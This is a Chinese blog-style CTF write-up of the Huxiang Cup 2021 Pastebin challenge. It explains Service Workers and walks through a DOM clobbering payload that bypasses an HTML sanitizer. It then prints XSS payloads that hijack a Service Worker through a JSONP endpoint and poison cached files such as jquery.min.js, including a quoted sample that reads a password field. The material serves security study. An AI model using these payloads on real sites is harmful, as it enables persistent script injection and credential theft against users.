<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>前端安全---湖湘杯2021-Pastebin复现学习 | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="前端安全—湖湘杯2021-Pastebin复现学习一、Service Worker介绍​    Service Worker可以理解为客户端与服务器之间的一个代理服务器。当网站中注册了Service Worker，那么它就可以拦截请求，根据开发者定义的程序，来判断是将请求传送给服务端还是直接通过缓存返回给客户端。 ​    下面简单来实现一下Service Worker： 123456789101">
<meta property="og:type" content="article">
<meta property="og:title" content="前端安全---湖湘杯2021-Pastebin复现学习">
<meta property="og:url" content="http://example.com/2021/12/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---%E6%B9%96%E6%B9%98%E6%9D%AF2021-Pastebin%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="前端安全—湖湘杯2021-Pastebin复现学习一、Service Worker介绍​    Service Worker可以理解为客户端与服务器之间的一个代理服务器。当网站中注册了Service Worker，那么它就可以拦截请求，根据开发者定义的程序，来判断是将请求传送给服务端还是直接通过缓存返回给客户端。 ​    下面简单来实现一下Service Worker： 123456789101">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211221132704453.png">
<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211221141856042.png">
<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211221163007863.png">
<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211221171935020.png">
<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211221172024957.png">
<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211221180339796.png">
<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211223095823428.png">
<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211223113329929.png">
<meta property="article:published_time" content="2021-12-23T03:38:34.000Z">
<meta property="article:modified_time" content="2021-12-23T03:38:34.000Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211221132704453.png">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.4.2"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-前端安全---湖湘杯2021-Pastebin复现学习" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/12/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---%E6%B9%96%E6%B9%98%E6%9D%AF2021-Pastebin%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/" class="article-date">
  <time datetime="2021-12-23T03:38:34.000Z" itemprop="datePublished">2021-12-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      前端安全---湖湘杯2021-Pastebin复现学习
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前端安全—湖湘杯2021-Pastebin复现学习"><a href="#前端安全—湖湘杯2021-Pastebin复现学习" class="headerlink" title="前端安全—湖湘杯2021-Pastebin复现学习"></a>前端安全—湖湘杯2021-Pastebin复现学习</h1><h2 id="一、Service-Worker介绍"><a href="#一、Service-Worker介绍" class="headerlink" title="一、Service Worker介绍"></a>一、<code>Service Worker</code>介绍</h2><p>​    <code>Service Worker</code>可以理解为客户端与服务器之间的一个代理服务器。当网站中注册了<code>Service Worker</code>，那么它就可以拦截请求，根据开发者定义的程序，来判断是将请求传送给服务端还是直接通过缓存返回给客户端。</p>
<p>​    下面简单来实现一下<code>Service Worker</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># index.html</span><br><span class="line">&lt;script&gt;</span><br><span class="line">        if(&#x27;serviceWorker&#x27; in navigator)&#123;</span><br><span class="line">            window.addEventListener(&#x27;load&#x27;,function()&#123;</span><br><span class="line">                navigator.serviceWorker.register(&#x27;./ws.js&#x27;,&#123;scope: &#x27;./&#x27;&#125;)</span><br><span class="line">                .then(function (registration) &#123;</span><br><span class="line">                    console.log(&#x27;serviceWorker registered&#x27;)</span><br><span class="line">                  &#125;)</span><br><span class="line">                .catch(function (err) &#123;</span><br><span class="line">                    console.log(&#x27;serviceWorker regist failed&#x27;)</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>​    简单解释一下代码：首先判断浏览器是否支持<code>Service Worker</code>，然后创建一个<code>Service Worker</code>，并指定其执行的代码以及作用域<code>scope</code>，该作用域表示的内容为拦截指定目录下的所有请求。创建成功之后，会执行<code>then</code>，否则执行<code>catch</code>。</p>
<p>​    在创建<code>Service Worker</code>的时候，指定了运行代码，既可以通过文件的形式指定，也可以直接通过代码的形式执行。接下来我们在<code>ws.js</code>中定义缓存规则代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">this.addEventListener(&#x27;install&#x27;,function(event)&#123;</span><br><span class="line">    event.waitUntil(</span><br><span class="line">        caches.open(&#x27;m1sn0w&#x27;).then(function (cache) &#123; </span><br><span class="line">            return cache.addAll([</span><br><span class="line">                &#x27;./index.html&#x27;</span><br><span class="line">            ])</span><br><span class="line">         &#125;)</span><br><span class="line">    )</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">this.addEventListener(&#x27;fetch&#x27;,function (event) &#123;</span><br><span class="line">    event.respondWith(</span><br><span class="line">        new Response(&#x27;m1sn0w&#x27;,&#123;headers: &#123;&#x27;Content-Type&#x27;:&#x27;text/html&#x27;&#125;&#125;)</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>​    这个文件中定义了两个事件，一个是<code>install</code>事件，另外一个是<code>fetch</code>事件，<code>install</code>事件一般用来设置浏览器的缓存逻辑，可以指定要缓存的资源路径文件，而<code>fetch</code>事件是拦截请求后所作的动作，例如上面直接页面，内容为<code>m1sn0w</code>。在后续的<code>XSS</code>持久化利用中，主要使用到<code>fetch</code>这个事件。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211221132704453.png" alt="image-20211221132704453"></p>
<h2 id="二、劫持Service-Worker"><a href="#二、劫持Service-Worker" class="headerlink" title="二、劫持Service Worker"></a>二、劫持<code>Service Worker</code></h2><p>​    假设存在一个反射型<code>XSS</code>漏洞利用点，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;./index.php&quot; method=&quot;POST&quot; &gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;xss&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        if(isset($_POST[&#x27;xss&#x27;]))&#123;</span><br><span class="line">            echo $_POST[&#x27;xss&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    如果想要劫持<code>Service Worker</code>的话，还需要一个条件，就是同域环境下需要一个<code>jsonp</code>，因为在后续构造<code>fetch</code>事件的时候，需要这个<code>jsonp</code>来将构造的代码返回，从而被当作执行的代码，例如，我在同域环境下给出一个<code>jsonp</code>（其实只需要能返回<code>GET</code>请求的数据就行）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># evil.js</span><br><span class="line">&lt;?php</span><br><span class="line">	header(&#x27;Content-type: text/javascript&#x27;);</span><br><span class="line">    $callback=$_GET[&#x27;callback&#x27;];</span><br><span class="line">    echo $callback;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>​    这里需要返回头部信息为<code>text/javascript</code>，因为我们需要返回回来的代码被当作<code>JS</code>处理。然后我们构造如下<code>Payload</code>，并指定了缓存路径为<code>./m1sn0w/</code>，通过<code>POST</code>提交上去：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">navigator.serviceWorker.register(&#x27;./evil.php?callback=onfetch=function(e)&#123;console.log(1);e.respondWith(new Response(&quot;m1sn0w&quot;,&#123;headers: &#123;&quot;Content-Type&quot;:&quot;text/html&quot;&#125;&#125;))&#125;&#x27;,&#123;scope: &#x27;./m1sn0w/&#x27;&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>​    之后我访问<code>/m1sn0w/</code>目录下的任何文件，都会返回<code>m1sn0w</code>字符。（不管文件是否存在）</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211221141856042.png" alt="image-20211221141856042"></p>
<h2 id="三、湖湘杯Pastebin"><a href="#三、湖湘杯Pastebin" class="headerlink" title="三、湖湘杯Pastebin"></a>三、湖湘杯<code>Pastebin</code></h2><p>​    这里只探究一下涉及到的两个前端知识点，一个是<code>DOM Clobbering</code>，另外一个就是污染<code>Service Worker</code>来持久化<code>XSS</code>。</p>
<h3 id="1、DOM-Clobbering绕过检验函数"><a href="#1、DOM-Clobbering绕过检验函数" class="headerlink" title="1、DOM Clobbering绕过检验函数"></a>1、<code>DOM Clobbering</code>绕过检验函数</h3><p>​    首先是第一个漏洞，<code>DOM Clobbering</code>，我们根据<code>payload</code>去调试分析一下整条链：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># payload</span><br><span class="line">&lt;form&gt;&lt;input name=removeChild&gt;&lt;/form&gt;&lt;img src=x onerror=alert(1337)&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211221163007863.png" alt="image-20211221163007863"></p>
<p>​    在此之前，简单分析一下前端校验代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">async function do_things(id) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        var html = await get(id);</span><br><span class="line">        var doc = new DOMParser().parseFromString(html, &quot;text/html&quot;);</span><br><span class="line">        if(doc.querySelectorAll(&quot;math&quot;).length !== 0 || doc.querySelectorAll(&quot;svg&quot;).length !== 0 || doc.querySelectorAll(&quot;base&quot;).length !== 0 || doc.querySelectorAll(&quot;object&quot;).length !== 0)&#123;</span><br><span class="line">            console.log(&quot;filtered&quot;);</span><br><span class="line">            return &quot;&lt;b&gt;Your paste have been filtered&lt;/b&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        html = safepaste.sanitize(html);</span><br><span class="line">    &#125; catch(e) &#123;</span><br><span class="line">        // fetch failed</span><br><span class="line">        console.log(e)</span><br><span class="line">    &#125;</span><br><span class="line">    return html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    这里用到<code>try...catch</code>语句，但是在<code>catch</code>语句中并没有将程序结束，也就是说<code>catch</code>之后，程序还是会返回<code>html</code>变量。所以这里的思路就是在<code>try</code>语句块中触发报错，从而逃过<code>sanitize</code>函数的检查。经过上下文分析，可以知道<code>html</code>变量是受我们控制的。</p>
<p>​    通过调试代码分析，最终会调用到<code>(new goog.html.sanitizer.HtmlSanitizer).sanitize(a);</code>，而<code>a</code>变量就是受控的<code>html</code>变量。继续跟进<code>sanitize(a)</code>代码，会经过如下函数处理：<code>this.processToString(a)</code>–&gt;<code>this.processToTree(a)</code>–&gt;<code>goog.dom.removeChildren(d)</code>。</p>
<p>​    变量<code>a</code>在<code>processToTree</code>这个函数中进行了一些处理，也就是将字符串转换成了<code>html</code>标签。然后获取了整个标签的父标签，也就是最外层的标签对象，并将其赋值给了<code>d</code>变量。</p>
<p>​    然后将<code>d</code>变量传送给了<code>goog.dom.removeChildren</code>函数处理，我们看看该函数的具体实现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">goog.dom.removeChildren = function(a) &#123;</span><br><span class="line">    for (var b; b = a.firstChild; ) &#123;</span><br><span class="line">        a.removeChild(b)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    由于这里传入的变量是一个标签对象，了解<code>DOM Clobbering</code>的话就很容易看出来这里存在漏洞。例如传入的数据是<code>&lt;form&gt;</code>标签，其子标签元素<code>input</code>的<code>name</code>值为<code>removeChild</code>，那么上面的<code>a.removeChild</code>表示的就是<code>&lt;input&gt;</code>这个标签对象，而不再是函数，因此，这里最终会报错。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211221171935020.png" alt="image-20211221171935020"></p>
<p>​    我在这里加了一个<code>console.log</code>输出变量，最终控制台输出<code>&lt;input&gt;</code>标签对象：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211221172024957.png" alt="image-20211221172024957"></p>
<p>​    因此，我们最终构造<code>payload</code>的时候，只需要在前面加上<code>&lt;form&gt;&lt;input name=removeChild&gt;&lt;/form&gt;</code>即可逃过校验函数的检测，后面就可以构造<code>xss</code>利用代码。</p>
<h3 id="2、修改Service-Worker缓存"><a href="#2、修改Service-Worker缓存" class="headerlink" title="2、修改Service Worker缓存"></a>2、修改<code>Service Worker</code>缓存</h3><p>​    该题的第二个考点就是污染<code>Service Worker</code>来持久化<code>XSS</code>。先不谈为什么这里需要持久化，我们先单纯地学习一下这个知识点。出题师傅给了一篇论文，<code>https://swcacheattack.secpriv.wien/</code>，我们先对论文里面的内容做一个了解与分析。</p>
<p>​    文章给出的攻击思路，大概就是利用<code>xss</code>漏洞去污染<code>Service Worker</code>缓存，然后将缓存中的一些静态数据修改掉，当用户再次访问页面的时候，由于<code>Service Worker</code>缓存的存在，会直接将缓存的数据返回给用户。而这些缓存的数据，由于被修改了，这样也就达到了攻击用户的目的。</p>
<p>​    我们对文中给出的<code>payload</code>做一个简单的分析：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(async () =&gt; &#123;</span><br><span class="line">    let p = `&lt;script&gt;document.querySelector(&#x27;#col-add button&#x27;).addEventListener(&#x27;click&#x27;, (event) =&gt; &#123;alert(&#x27;Password stolen: &#x27; + document.querySelector(&#x27;#col-add input[type=&quot;password&quot;]&#x27;).value);&#125;);&lt;/script&gt;`;</span><br><span class="line">    let t = &#x27;/safenotes/&#x27;;</span><br><span class="line">    let c = await caches.open(&#x27;static&#x27;);</span><br><span class="line">    let r = await c.match(t);</span><br><span class="line">    let rt = await r.text();</span><br><span class="line">    await c.put(t, </span><br><span class="line">      new Response(rt.replace(&#x27;&lt;/body&gt;&#x27;, p + &#x27;&lt;/body&gt;&#x27;), &#123;</span><br><span class="line">        status: 200,</span><br><span class="line">        statusText: &#x27;OK&#x27;,</span><br><span class="line">        headers: r.headers</span><br><span class="line">      &#125;)</span><br><span class="line">    );</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>​    这里的<code>caches.open</code>用来打开<code>static</code>缓存空间，然后通过<code>match</code>来寻找缓存文件，这里找到的文件如图所示：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211221180339796.png" alt="image-20211221180339796"></p>
<p>​    接下来，它将文件的内容读取出来，然后将构造的<code>payload</code>代码插入到文件内容中，并将更新的文件内容再次写入缓存空间。我们简单分析一下该攻击手法，攻击前提是存在一个<code>XSS</code>漏洞点，然后网站原本开启了<code>Service Worker</code>缓存。利用<code>XSS</code>漏洞，将缓存文件内容替换，从而达到攻击的目的。</p>
<p>​    我们回到这个题目，可以通过查看缓存空间，来获知哪些文件进行了缓存：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211223095823428.png" alt="image-20211223095823428"></p>
<p>​    接下来的利用方式就是结合上面的思路，我们修改缓存文件，例如<code>jquery.min.js</code>，当有一个地方引入这个文件的时候，就会触发我们修改添加进去的<code>xss</code>恶意代码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">(async () =&gt; &#123;</span><br><span class="line">    let e = &quot;/jquery.min.js&quot;, </span><br><span class="line">        t = await caches.open(&quot;static-resources&quot;), </span><br><span class="line">        a = await t.match(e), </span><br><span class="line">        s = await a.text();</span><br><span class="line">    await t.put(e, new Response(s.replace(&quot;jQuery=C.$=S),S&#125;);&quot;,</span><br><span class="line">        `jQuery=C.$=S),S&#125;);alert(&#x27;xss&#x27;);`),  </span><br><span class="line">        &#123;</span><br><span class="line">            status: 200,</span><br><span class="line">            statusText: &quot;OK&quot;,</span><br><span class="line">            headers: a.headers</span><br><span class="line">        &#125;))</span><br><span class="line">&#125;)();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>​    在本地简单搭建了一个<code>demo</code>来对此攻击示例做一个测试。在存在<code>xss</code>漏洞点的地方，输入上述<code>payload</code>，结果会导致<code>Jquey</code>缓存文件内容发生了改变，当我们再次访问导入了<code>Jquery</code>的页面的时候，会弹出<code>xss</code>框。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211223113329929.png" alt="image-20211223113329929"></p>
<p>​    该题接下来的利用就是分析<code>bot</code>程序的行为，然后修改<code>action</code>属性值，最终将<code>flag</code>数据外带从而拿到<code>flag</code>值。</p>
<p>参考文章：</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/306014.html">https://www.freebuf.com/articles/web/306014.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/12/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---%E6%B9%96%E6%B9%98%E6%9D%AF2021-Pastebin%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/" data-id="cl8h29x4h0008dgdp9lch246q" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/01/07/HXP%20CTF%202021%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%B0RCE%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          HXP CTF 2021文件包含到RCE技巧学习
        
      </div>
    </a>
  
  
    <a href="/2021/12/17/CVE-2021-42278&CVE-2021-42278%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">CVE-2021-42278&amp;CVE-2021-42278漏洞复现与分析</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 10px;">域渗透</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2022/09/25/%E5%9F%9F%E6%B8%97%E9%80%8F---%E9%BB%84%E9%87%91%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E4%BC%AA%E9%80%A0/">域渗透---黄金白银票据伪造</a>
          </li>
        
          <li>
            <a href="/2022/08/10/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">xxe外部实体注入漏洞</a>
          </li>
        
          <li>
            <a href="/2022/06/04/WordPress%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-21661%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%89/">WordPress SQL注入漏洞（CVE-2022-21661分析与复现）</a>
          </li>
        
          <li>
            <a href="/2022/03/31/Java%E5%AE%89%E5%85%A8---JNDI%E6%B3%A8%E5%85%A5%E8%A7%A3%E6%9E%90/">Java安全---JNDI注入解析</a>
          </li>
        
          <li>
            <a href="/2022/03/30/Java%20CC%E9%93%BE1-5%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/">Java CC链1-5分析与总结</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>